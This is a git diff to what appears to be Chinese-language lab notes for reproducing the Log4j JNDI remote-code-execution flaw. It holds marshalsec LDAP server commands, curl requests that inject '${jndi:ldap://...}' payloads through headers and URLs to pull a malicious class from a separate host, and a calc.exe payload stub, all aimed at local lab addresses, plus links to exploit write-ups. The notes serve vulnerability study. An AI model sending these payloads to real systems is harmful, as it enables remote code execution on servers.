@@ -59,13 +59,13 @@ javac Log4jRCE.java
 php -S 127.0.0.1:8888
 
 python -m http.server
-http://localhost:8000/
+# http://localhost:8000/
 
 docker cp /usr/src/myapp/target/marshalsec-0.0.3-SNAPSHOT-all.jar ./
 java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Log4jRCE"
+java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/Log4jRCE"
 
 docker run --rm --name log4jpwn -p8080:8080 log4jpwn
-
 
 curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/a}' 'localhost:8080/${jndi:ldap://172.29.78.192:1389/a}/?pwn=$\{jndi:ldap://172.29.78.192:1389/a\}'
 curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCELinux}' 'localhost:8080'
@@ -73,7 +73,11 @@ curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCE}' 'localhost:8
 172.17.0.2
 # vim Log4jRCE.java
 Runtion.getRuntime().exec("calc.exe")
-python3 -m http.server
+
+```
+
+```bash
+ mvn --quiet clean -f "d:\dev\lab\apache-log4j-rce-poc\pom.xml" && mvn --quiet org.apache.maven.plugins:maven-dependency-plugin:3.0.2:tree -f "d:\dev\lab\apache-log4j-rce-poc\pom.xml" -DoutputFile="d:\dev\lab\apache-log4j-rce-poc\target\dependencies.txt" -DoutputType=dot -DappendOutput=true 'mvn'
 ```
 
 ${jndi:ldap://xxx/Log4jRCE}
@@ -289,3 +293,17 @@ https://itsc.nju.edu.cn/7a/42/c41947a555586/page.htm
   在JDK8或更低版本上的Elasticsearch容易通过DNS发生信息泄漏，这可以通过简单的JVM属性更改来修复。 
   信息泄漏不允许访问Elasticsearch集群中的数据。 
   我们还将发布一个新版本的Elasticsearch，该版本默认包含JVM属性，为了谨慎起见，它删除了Log4j的某些组件。 
+
+
+### 其它参考
+
+
+安全工具 | log4j ldap 恶意class下载工具
+https://www.anquanke.com/post/id/263300
+Log4J 漏洞复现+漏洞靶场
+https://www.anquanke.com/post/id/263132
+Log4shell漏洞研究及其挖矿案例分析
+https://www.anquanke.com/post/id/263217
+
+在 Struts2 中触发 Log4j JNDI RCE 漏洞分析
+https://www.anquanke.com/post/id/262852
